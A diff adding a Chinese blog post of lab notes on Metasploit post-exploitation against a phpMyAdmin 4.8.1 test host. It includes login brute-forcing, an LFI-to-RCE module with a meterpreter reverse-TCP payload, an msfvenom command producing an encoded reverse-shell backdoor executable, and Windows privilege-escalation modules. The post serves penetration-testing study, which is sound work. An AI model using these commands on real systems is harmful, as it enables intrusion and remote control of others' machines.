@@ -20,18 +20,24 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="介绍如何用msf后渗透例如提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf后渗透">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="介绍如何用msf后渗透例如提权">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\rubik\Desktop\msfpost\img\1.png">
+<meta property="og:image" content="c:\Users\rubik\Desktop\msfpost\img\2.png">
 <meta property="article:published_time" content="2023-08-21T08:50:47.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:50:47.665Z">
+<meta property="article:modified_time" content="2023-08-21T15:27:23.485Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="渗透工具">
+<meta property="article:tag" content="木马">
+<meta property="article:tag" content="远控">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\rubik\Desktop\msfpost\img\1.png">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/">
 
@@ -222,11 +228,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:50:47" itemprop="dateCreated datePublished" datetime="2023-08-21T16:50:47+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:50:47 / 修改时间：23:27:23" itemprop="dateCreated datePublished" datetime="2023-08-21T16:50:47+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">介绍如何用msf后渗透例如提权</div>
 
         </div>
       </header>
@@ -237,7 +254,52 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy +  phpmyadmin 4.8.1 </p>
+<p>创建用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user www admin@123 /add</span><br><span class="line">net localgroup administrators 账号 /add # 添加权限</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\rubik\Desktop\msfpost\img\1.png" alt=""></p>
+<p>设置的漏洞点: 远程文件包含</p>
+<p>80端口被占用问题:</p>
+<p><img src="C:\Users\rubik\Desktop\msfpost\img\2.png" alt=""></p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>爆破：</p>
+<p>攻击模块：auxiliary/scanner/http/phpmyadmin_login  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali自带字典</span><br><span class="line">/usr/share/dirb/wordlists/ </span><br><span class="line">/usr/share/wordlists/</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure>
+<p>远程文件包含：</p>
+<p>使用的模块：exploit/multi/http/phpmyadmin_lfi_rce </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">php/meterpreter/reverse_tcp	# 功能不全面，执可执行的命令较少</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>网站的根目录： www/</p>
+<p>192.168.226.173/phpinf.php</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li><p>借助其他的工具来进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getwd # 确认当前目录 </span><br><span class="line">edit 1.php # 使用的是vim的编辑。i：进入编辑模式  esc：退出编辑模式  :wq ：保存退出 </span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>直接通过msf进行操作</li>
+</ol>
+<p>​        生成新的后门文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.226.128 lport=1234 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">use post/multi/recon/local_exploit_suggester # 查看能用的漏洞 (有时候可能会失败.)</span><br><span class="line"></span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy # 提权模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>linux命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano # 查看端口</span><br></pre></td></tr></table></figure>
+<p>反弹shell:</p>
+<p>自己 ——-&gt; 目标服务器</p>
+<p>目标服务器 ——-&gt; 自己  反向链接出来的shell,就叫反弹shell </p>
+<h2 id="常用的提权方式："><a href="#常用的提权方式：" class="headerlink" title="常用的提权方式："></a>常用的提权方式：</h2><ol>
+<li><p>利用运行的应用漏洞提权 （限制条件比较多）</p>
+</li>
+<li><p>利用系统漏洞进行提权。</p>
+<ol>
+<li><p>系统补丁 （没打补丁能利用的点）</p>
+<p>根据提供的漏洞补丁的数量.</p>
+<p>去除掉已经打了补丁的漏洞. 然后显示常见的其他的可利用的漏洞</p>
+<p>没打补丁、意味着可能漏洞是能被利用的。所以我们就可以根据补丁数量，去判断有没有可用的点</p>
+<p>补丁通常是需要自己去打,安全工具,只是能识别出攻击流量.然后ban掉这些流量</p>
+</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 查看到当前系统的补丁信息</span><br></pre></td></tr></table></figure>
+
     </div>
 
     
@@ -262,6 +324,12 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag"># 渗透工具</a>
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"># 木马</a>
+              <a href="/tags/%E8%BF%9C%E6%8E%A7/" rel="tag"># 远控</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
 
         
 
@@ -335,6 +403,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-text">常用的提权方式：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +426,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
